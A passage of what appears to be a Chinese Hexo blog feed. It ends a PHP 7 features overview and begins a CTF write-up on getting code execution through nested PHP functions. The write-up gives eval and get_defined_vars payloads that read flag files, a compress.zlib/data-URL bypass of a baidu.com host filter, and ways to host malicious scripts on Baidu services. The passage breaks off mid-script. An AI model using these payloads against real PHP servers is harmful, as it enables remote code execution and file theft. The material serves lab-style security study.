href="#太空船操作符（组合比较符）" class="headerlink" title="太空船操作符（组合比较符）"></a>太空船操作符（组合比较符）</h2><p>太空船操作符用于比较两个表达式。当$a小于、等于或大于$b时它分别返回-1、0或1。 比较的原则是沿用 PHP 的<a href="https://www.php.net/manual/zh/types.comparisons.php"><strong>常规比较规则</strong></a>进行的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 整数</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span> &lt;=&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span> &lt;=&gt; <span class="hljs-number">2</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">2</span> &lt;=&gt; <span class="hljs-number">1</span>; <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// 浮点数</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1.5</span> &lt;=&gt; <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1.5</span> &lt;=&gt; <span class="hljs-number">2.5</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">2.5</span> &lt;=&gt; <span class="hljs-number">1.5</span>; <span class="hljs-comment">// 1</span><br> <br><span class="hljs-comment">// 字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;a&quot;</span>; <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;b&quot;</span>; <span class="hljs-comment">// -1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;b&quot;</span> &lt;=&gt; <span class="hljs-string">&quot;a&quot;</span>; <span class="hljs-comment">// 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h2><p>现在支持通过<em>new class</em> 来实例化一个匿名类，这可以用来替代一些“用后即焚”的完整类定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$msg</span></span>)</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Application</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLogger</span>(<span class="hljs-params"></span>): <span class="hljs-title">Logger</span> </span>&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;logger;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setLogger</span>(<span class="hljs-params">Logger <span class="hljs-variable">$logger</span></span>) </span>&#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Application</span>;<br><span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">setLogger</span>(<span class="hljs-keyword">new</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> Logger &#123;<br>    <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">log</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$msg</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;<br>    &#125;<br>&#125;);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$app</span>-&gt;<span class="hljs-title function_ invoke__">getLogger</span>());<br><br><span class="hljs-comment">#结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">object(class<span class="hljs-doctag">@anonymous</span>)#2 (0) &#123;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="Unicode-codepoint-转译语法"><a href="#Unicode-codepoint-转译语法" class="headerlink" title="Unicode codepoint 转译语法"></a>Unicode codepoint 转译语法</h2><p>这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;aa&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;0000aa&#125;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\u&#123;9999&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="导入use声名组"><a href="#导入use声名组" class="headerlink" title="导入use声名组"></a>导入use声名组</h2><p>从同一 <code>namespace</code> 导入的类、函数和常量现在可以通过单个 <a href="https://www.php.net/manual/zh/language.namespaces.importing.php"><em>use</em></a> 语句 一次性导入了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// PHP 7 之前的代码</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassA</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassB</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ClassC</span> <span class="hljs-keyword">as</span> <span class="hljs-title">C</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_a</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_b</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">fn_c</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstA</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstB</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\<span class="hljs-title">ConstC</span>;<br><br><span class="hljs-comment">// PHP 7+ 及更高版本的代码</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">ClassA</span>, <span class="hljs-title">ClassB</span>, <span class="hljs-title">ClassC</span> <span class="hljs-keyword">as</span> <span class="hljs-title">C</span>&#125;;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">function</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">fn_a</span>, <span class="hljs-title">fn_b</span>, <span class="hljs-title">fn_c</span>&#125;;<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">const</span> <span class="hljs-title">some</span>\<span class="hljs-title">namespace</span>\&#123;<span class="hljs-title">ConstA</span>, <span class="hljs-title">ConstB</span>, <span class="hljs-title">ConstC</span>&#125;;<br></code></pre></td></tr></table></figure><h2 id="放宽了保留词限制"><a href="#放宽了保留词限制" class="headerlink" title="放宽了保留词限制"></a>放宽了保留词限制</h2><p>现在允许全局保留词用于类&#x2F;接口&#x2F;Trait 中的属性、常量和方法名。 在引入新关键词时，此变更减少了对向后兼容的破坏，避免了 API 命名的限制。</p><p>使用流畅的接口实现内部 DSL 时，这非常有用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 以前不能用  &#x27;new&#x27;、&#x27;private&#x27; 和 &#x27;for&#x27;</span><br><span class="hljs-title class_">Project</span>::<span class="hljs-keyword">new</span>(<span class="hljs-string">&#x27;Project Name&#x27;</span>)-&gt;<span class="hljs-keyword">private</span>()-&gt;<span class="hljs-keyword">for</span>(<span class="hljs-string">&#x27;purpose here&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">with</span>(<span class="hljs-string">&#x27;username here&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>唯一的限制是： <em>class</em>关键词不能用于常量名，否则会和 类名解析语法冲突 (<em>ClassName::class</em>)。</p><h2 id="（弃用）PHP4-风格的构造函数"><a href="#（弃用）PHP4-风格的构造函数" class="headerlink" title="（弃用）PHP4 风格的构造函数"></a>（弃用）PHP4 风格的构造函数</h2><p>PHP4 风格的构造函数（方法名和类名一样）将被弃用，并在将来移除。 如果在类中仅使用了 PHP4 风格的构造函数，PHP7 会产生 <strong>E_DEPRECATED</strong> 警告。 如果还定义了 <strong>__construct()</strong> 方法则不受影响。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I am the constructor&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="（弃用）静态调用非静态的方法"><a href="#（弃用）静态调用非静态的方法" class="headerlink" title="（弃用）静态调用非静态的方法"></a>（弃用）静态调用非静态的方法</h2><p>废弃了<strong>静态</strong>调用未声明成 <strong>static</strong> 的方法，未来可能会彻底移除该功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;I am not static!&#x27;</span>;<br>    &#125;<br>&#125;<br><br>foo::<span class="hljs-title function_ invoke__">bar</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="错误和异常处理相关的变更-¶"><a href="#错误和异常处理相关的变更-¶" class="headerlink" title="错误和异常处理相关的变更 ¶"></a>错误和异常处理相关的变更<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.error-handling"> ¶</a></h2><h2 id="HTTP-RAW-POST-DATA-被移除-¶"><a href="#HTTP-RAW-POST-DATA-被移除-¶" class="headerlink" title="$HTTP_RAW_POST_DATA 被移除 ¶"></a>$HTTP_RAW_POST_DATA 被移除<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.http-raw-post-data"> ¶</a></h2><h2 id="从不匹配的上下文发起调用-¶"><a href="#从不匹配的上下文发起调用-¶" class="headerlink" title="从不匹配的上下文发起调用 ¶"></a>从不匹配的上下文发起调用<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.incompatible-this"> ¶</a></h2><h2 id="函数定义不可以包含多个同名参数-¶"><a href="#函数定义不可以包含多个同名参数-¶" class="headerlink" title="函数定义不可以包含多个同名参数 ¶"></a>函数定义不可以包含多个同名参数<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameters"> ¶</a></h2><h2 id="在函数中检视参数值会返回-当前-的值-¶"><a href="#在函数中检视参数值会返回-当前-的值-¶" class="headerlink" title="在函数中检视参数值会返回 当前 的值 ¶"></a>在函数中检视参数值会返回 <em>当前</em> 的值<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.func-parameter-modified"> ¶</a></h2><h2 id="INI-文件中-注释格式被移除-¶"><a href="#INI-文件中-注释格式被移除-¶" class="headerlink" title="INI 文件中 # 注释格式被移除 ¶"></a>INI 文件中 <em>#</em> 注释格式被移除<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.ini-comments"> ¶</a></h2><h2 id="Switch-语句不可以包含多个-default-块-¶"><a href="#Switch-语句不可以包含多个-default-块-¶" class="headerlink" title="Switch 语句不可以包含多个 default 块 ¶"></a>Switch 语句不可以包含多个 default 块<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.multiple-default"> ¶</a></h2><h2 id="JSON-扩展已经被-JSOND-取代-¶"><a href="#JSON-扩展已经被-JSOND-取代-¶" class="headerlink" title="JSON 扩展已经被 JSOND 取代 ¶"></a>JSON 扩展已经被 JSOND 取代<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.json-to-jsond"> ¶</a></h2><h2 id="在数值溢出的时候，内部函数将会失败-¶"><a href="#在数值溢出的时候，内部函数将会失败-¶" class="headerlink" title="在数值溢出的时候，内部函数将会失败 ¶"></a>在数值溢出的时候，内部函数将会失败<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.internal-function-failure-overflow"> ¶</a></h2><h2 id="自定义会话处理器的返回值修复-¶"><a href="#自定义会话处理器的返回值修复-¶" class="headerlink" title="自定义会话处理器的返回值修复 ¶"></a>自定义会话处理器的返回值修复<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.fixes-custom-session-handler"> ¶</a></h2><h2 id="相等的元素在排序时的顺序问题-¶"><a href="#相等的元素在排序时的顺序问题-¶" class="headerlink" title="相等的元素在排序时的顺序问题 ¶"></a>相等的元素在排序时的顺序问题<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.sort-order"> ¶</a></h2><h2 id="错误的使用-break-和-switch-语句-¶"><a href="#错误的使用-break-和-switch-语句-¶" class="headerlink" title="错误的使用 break 和 switch 语句 ¶"></a>错误的使用 break 和 switch 语句<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.break-continue"> ¶</a></h2><h2 id="Mhash-不再是一个单独的扩展了-¶"><a href="#Mhash-不再是一个单独的扩展了-¶" class="headerlink" title="Mhash 不再是一个单独的扩展了 ¶"></a>Mhash 不再是一个单独的扩展了<a href="https://www.php.net/manual/zh/migration70.incompatible.php#migration70.incompatible.other.mhash"> ¶</a></h2><h2 id="标量类型声明-¶"><a href="#标量类型声明-¶" class="headerlink" title="标量类型声明 ¶"></a>标量类型声明<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.scalar-type-declarations"> ¶</a></h2><h2 id="返回值类型声明-¶"><a href="#返回值类型声明-¶" class="headerlink" title="返回值类型声明 ¶"></a>返回值类型声明<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations"> ¶</a></h2><h2 id="生成器可以返回表达式-¶"><a href="#生成器可以返回表达式-¶" class="headerlink" title="生成器可以返回表达式 ¶"></a>生成器可以返回表达式<a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.generator-return-expressions"> ¶</a></h2><h2 id="允许在克隆表达式上访问对象成员-¶"><a href="#允许在克隆表达式上访问对象成员-¶" class="headerlink" title="允许在克隆表达式上访问对象成员[ ¶]("></a>允许在克隆表达式上访问对象成员[ ¶](</h2>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>循环嵌套函数GetShell</title>
    <link href="/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/"/>
    <url>/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/</url>
    
    <content type="html"><![CDATA[<h1 id="函数妙用"><a href="#函数妙用" class="headerlink" title="函数妙用"></a>函数妙用</h1><h2 id="code-breaking-easy-phplimit函数的巧妙搭配"><a href="#code-breaking-easy-phplimit函数的巧妙搭配" class="headerlink" title="code-breaking_easy-phplimit函数的巧妙搭配"></a>code-breaking_easy-phplimit函数的巧妙搭配</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars">https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#get-defined-vars</a></li><li><a href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></li><li><a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;../&#x27;</span>));<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;../flag_phpbyp4ss&#x27;</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br></code></pre></td></tr></table></figure><h2 id="ByteCTF-boring-code"><a href="#ByteCTF-boring-code" class="headerlink" title="ByteCTF boring_code"></a>ByteCTF boring_code</h2><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><p><a href="http://www.guildhab.top/?p=1077">http://www.guildhab.top/?p=1077</a></p></li><li><p><a href="https://xz.aliyun.com/t/6316">https://xz.aliyun.com/t/6316</a></p></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\//i&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid_url</span>(<span class="hljs-variable">$url</span>)) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/baidu\.com$/&#x27;</span>, <span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;bye~&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error: host not allowed&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error: invalid url&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.第一步</p><p>第一步需要绕过<code>preg_match</code>的检测，网上见到的payload都是通过购买域名，url跳转等方法进行绕过。其实可以通过代码绕过。</p><p><strong>我的方法</strong></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">compress</span>.zlib://<span class="hljs-class"><span class="hljs-keyword">data</span>:@baidu.com/baidu.com,phpinfo()</span><br></code></pre></td></tr></table></figure><p><code>compress.zlib</code>绕过data协议的检测，<code>@</code>使<code>data:</code>被解释为用户名和密码，<code>baidu.com/baidu.com</code>中只要包含<code>/</code>就会被解释为合法的<code>media-type</code></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_1.png"></p><p><strong>其他方法</strong></p><ul><li><p>购买一个 xxxxbaidu.com 的域名</p></li><li><p>百度网盘链接</p><p><strong>这种方法的思路是将恶意代码上传到百度网盘 , 然后通过百度网盘的下载链接来绕过 baidu.com 的主机名限制 .</strong></p><ol><li><p><strong>将一个恶意脚本上传到百度网盘( 这里以 phpinfo() 为例 )</strong></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_3.png"></p></li><li><p><strong>通过开发者工具( F12 ) , 在 network 选项卡中可以找到目标文件的链接</strong></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_2.png"></p></li></ol></li><li><p>百度贴吧（<a href="https://www.4xseo.com/marketing/1280/">https://www.4xseo.com/marketing/1280/</a></p></li><li><p>百度爬虫</p><p>其原理大概就是 : <strong>百度的搜索引擎爬虫会爬到你的个人站点 , 当你在百度上点击自己站点时 , 并不是直接访问 . 而是利用百度的重定向机制 , 将你的网址转换成<code>http://www.baidu.com/link?url=xxxxxxxxxxxxxxx</code> , 通过这个链接可以绕过第一层防御并且拿到你站点上的恶意脚本 .</strong></p></li></ul><p>2.第二步</p><p>我们要获取<code>.</code>，可以通过获取<code>.</code>的ascii码，然后通过<code>chr</code>函数得到。写了个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$functions</span>=<span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFucntionParameter1</span>(<span class="hljs-params"><span class="hljs-variable">$func</span></span>) </span>&#123;<br>    <span class="hljs-variable">$ReflectionFunc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ReflectionFunction</span>(<span class="hljs-variable">$func</span>);<br>    <span class="hljs-variable">$nums</span>=<span class="hljs-variable">$ReflectionFunc</span>-&gt;<span class="hljs-title function_ invoke__">getNumberOfRequiredParameters</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nums</span>===<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-comment">#@print_r($func());</span><br>    <span class="hljs-comment">#echo &quot;\n#####\n&quot;;</span><br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$functions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vul</span>)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span 